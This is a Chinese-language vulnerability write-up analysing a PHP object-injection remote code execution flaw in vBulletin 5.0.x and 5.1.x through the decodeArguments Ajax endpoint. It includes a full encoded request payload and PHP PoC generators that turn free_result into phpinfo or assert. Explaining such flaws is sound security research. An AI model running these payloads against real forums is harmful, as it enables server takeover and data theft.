# unserialize() 实战之 vBulletin 5.x.x 远程代码执行

**Author: RickGray (知道创宇404安全实验室)**

近日，vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用`unserialize()`对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的[《PHP Object Injection》](https://www.owasp.org/index.php/PHP_Object_Injection)。

使用[原文](http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq)提供的 Payload 可以直接在受影响的站点上执行`phpinfo(1)`：

![](http://drops.javaweb.org/uploads/images/9a9dab0b95937138a5f7b79382fdf7ec1743a774.jpg)

具体 Payload 的构造过程也文中有所提及，但是笔者在对 vBulletin 5.1.x 版本进行测试的时候，发现原本的 Payload 并不能成功，甚是疑惑。然而在深入分析后，发现在具体利用的时候还需要结合 vBulletin 程序本身的一些代码结构才能得到一个较为通用的 Payload，通过下面的分析后就能够明白。

0x00 反序列化触发点跟踪
==============

* * *

虽然此次漏洞`unserialize()`函数的触发在曝光的文章中已经描述的很清楚了，并且对整个关键代码的触发流程也进行了说明，但是在深入跟踪和分析时，觉得还是有值得注意和学习的地方。

```
http://172.16.96.130/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D

```

通过观察服务端在处理PHP时的调用栈，可知服务端在处理上述请求时，会将`ajax/api/hook/decodeArguments`作为路由参数`$_REQUEST['routestring']`传递给地址路由处理过程。因其符合`ajax/api/[controller]/[method]`的 Ajax API 请求路由格式，会再调用`vB5_Frontend_ApplicationLight`实例中的`handleAjaxApi()`函数来进行相应的模块加载并调用处理函数：

```
protected function handleAjaxApi()
{
    $routeInfo = explode('/', $_REQUEST['routestring']);    

    if (count($routeInfo) < 4)
    {
        throw new vB5_Exception_Api('ajax', 'api', array(), 'invalid_request');
    }
    $params = array_merge($_POST, $_GET);
    $this->sendAsJson(Api_InterfaceAbstract::instance(Api_InterfaceAbstract::API_LIGHT)->callApi($routeInfo[2], $routeInfo[3], $params, true));
}

```

请求的`ajax/api/hook/decodeArguments`会实例化`hook`类然后调用`decodeArguments()`函数，原文中所提及的触发点就在此处：

```
public function decodeArguments($arguments)
{
    if ($args = @unserialize($arguments))
    {
        $result = '';

        foreach ($args AS $varname => $value)
        {
            $result .= $varname;

```

通过反序列化，我们可以使之能生成在执行环境上下文中已经定义好了的类实例，并通过寻找一个含有`__wakeup()`或者`__destruct()`魔术方法存在问题的类来进行利用。然后原文中所提到的利用方法并不是这样，其使用的是继承于 PHP 迭代器类型的`vB_dB_Result`类，由于`$args = @unserialize($arguments)`产生了一个迭代器`vB_dB_Result`类实例，因此在后面进行`foreach`操作时会首先调用其`rewind()`函数。

而在`rewind()`函数处理过程中，会根据实例变量状态进行调用：

```
public function rewind()
{
    if ($this->recordset)
    {
        $this->db->free_result($this->recordset);
    }

```

这里就可以通过反序列化来控制`$this->recordset`的值，并且`$this->db->free_result`最终会调用：

```
function free_result($queryresult)
{
    $this->sql = '';
    return @$this->functions['free_result']($queryresult);
}

```

`$this->functions['free_result']`原本的初始化值为`mysql_free_result`，但是由于反序列化的原因，我们也能控制`vB_dB_Result`类实例中的`db`成员，更改其对应的`functions['free_result']`为我们想要执行的函数，因此一个任意代码执行就产生了。

0x01 利用分析和完善
============

* * *

观察一下原文中提供的 Payload 构造 PoC：

```
<?php
class vB_Database {
       public $functions = array();
       public function __construct() {
               $this->functions['free_result'] = 'phpinfo';
       }
}    

class vB_dB_Result {
       protected $db;
       protected $recordset;
       public function __construct() {
               $this->db = new vB_Database();
               $this->recordset = 1;
       }
}    

print urlencode(serialize(new vB_dB_Result())) . "\n";

```

通过第一部分的分析，我们已经清楚了整个漏洞的函数调用过程和原因，并且也已经得知哪些参数可以得到控制和利用。因此这里我们修改`$this->functions['free_result'] = 'assert';`和`$this->recordset = 'var_dump(md5(1))';`，最终远程代码执行的的函数则会是`assert('var_dump(md5(1))')`：

![](http://drops.javaweb.org/uploads/images/89a17ff27bf97951fb38ecd5eca2bf1ded53a966.jpg)

这个时候其实 RCE 已经非常的顺利了，但是在进行测试的时候却发现了原文所提供的 PoC 只能复现 5.0.x 版本的 vBulletin，而 5.1.x 版本的却不可以。通过本地搭建测试环境，并使用同样的 PoC 去测试，发现在 5.1.x 版本中`vB_Database`被定义成了抽象类：

```
abstract class vB_Database
{
    /**
     * The type of result set to return from the database for a specific row.
     */

```

抽象类是不能直接进行实例化的，原文提供的 PoC 却是实例化的`vB_Database`类作为`vB_dB_Result`迭代器成员`db`的值，在服务端进行反序列化时会因为需要恢复实例为抽象类而导致失败：

![](http://drops.javaweb.org/uploads/images/8a164380c6a502dd11ab618442f45d758e96cee9.jpg)

这就是为什么在 5.1.x 版本上 PoC 会不成功的原因。然后要解决这个问题也很容易，通过跟踪调用栈，发现程序在反序列化未定义类时会调用程序注册的`autoload()`方法去动态加载类文件。这里 vBulletin 会依次调用`includes/vb5/autoloader.php`中的`_autoload`方法和`core/vb/vb.php`中的`autoload()`方法，成功加载即返回，失败则反序列化失败。所以要想继续使用原有 PoC 的思路来让反序列化后会执行`$this->db->free_result($this->recordset);`则需要找到一个继承于`vB_Database`抽象类的子类并且其源码文件路径能够在 autoload 过程中得到加载。

通过搜索，发现有如下类继承于`vB_Database`抽象类及其源码对应的路径：

![](http://drops.javaweb.org/uploads/images/2eee7cf0ada9d2b5faf3aaba0b6586fb9f5dbd85.jpg)

而终代码进行进行 autoload 的时候会解析传递的类名来动态构造尝试加载的源码文件路径：

```
...省略
    $fname = str_replace('_', '/', strtolower($class)) . '.php';    

    foreach (self::$_paths AS $path)
    {
        if (file_exists($path . $fname))
        {
            include($path . $fname);
            if (class_exists($class, false))
            {
                return true;
            }

```

上面这段代码存在于第一次调用的`__autoload()`里，可以看到对提供的类名以`_`进行了拆分，动态构造了加载路径（第二次 autoload() 的过程大致相同），简单分析一下就可以发现只有在反序列化`vB_Database_MySQL`和`vB_Database_MySQLi`这两个基于`vB_Database`抽象类的子类时，才能成功的动态加载其类定义所在的源码文件使得反序列化成功执行，最终才能控制参数进行任意代码执行。

所以，针对 5.1.x 版本 vBulletin 的 PoC 就可以得到了，使用`vB_Database_MySQL`或者`vB_Database_MySQLi`作为迭代器`vB_dB_Result`成员`db`的值即可。具体 PoC 如下：

```
<?php
class vB_Database_MySQL {
       public $functions = array();
       public function __construct() {
               $this->functions['free_result'] = 'assert';
       }
}    

class vB_dB_Result {
       protected $db;
       protected $recordset;
       public function __construct() {
               $this->db = new vB_Database_MySQL();
               $this->recordset = 'print("This Vuln In 5.1.7")';
       }
}    

print urlencode(serialize(new vB_dB_Result())) . "\n";

```

测试一下，成功执行`assert('print("This Vuln In 5.1.7")')`：

![](http://drops.javaweb.org/uploads/images/a1f2e19140668f78bf74639e61109d73c8764b3f.jpg)

当然了，PoC 不止上面所提供的这一种写法，仅供参考而已。

0x02 小结
=======

* * *

此次 vBulletin 5.x.x RCE 漏洞的曝光，从寻找触发点到对象的寻找，再到各种自动加载细节，不得不说是一个很好的 PHP 反序列化漏洞实战实例。不仔细去分析真的不能发现原作者清晰的思路和对程序的熟悉程度。

另外，[Check Point](http://blog.checkpoint.com/)在其官方博客上也公布了反序列化的另一个利用点，通过反序列化出一个模版对象最终调用`eval()`函数进行执行（[原文](http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/)）。

0x03 参考
=======

* * *

*   [http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq](http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq)
*   [https://www.owasp.org/index.php/PHP_Object_Injection](https://www.owasp.org/index.php/PHP_Object_Injection)
*   [http://php.net/manual/en/class.iterator.php](http://php.net/manual/en/class.iterator.php)
*   [http://www.php.net/manual/en/function.autoload.php](http://www.php.net/manual/en/function.autoload.php)
*   [http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/](http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/)
*   [http://www.sebug.net/vuldb/ssvid-89707](http://www.sebug.net/vuldb/ssvid-89707)

原文出处：[http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/](http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/)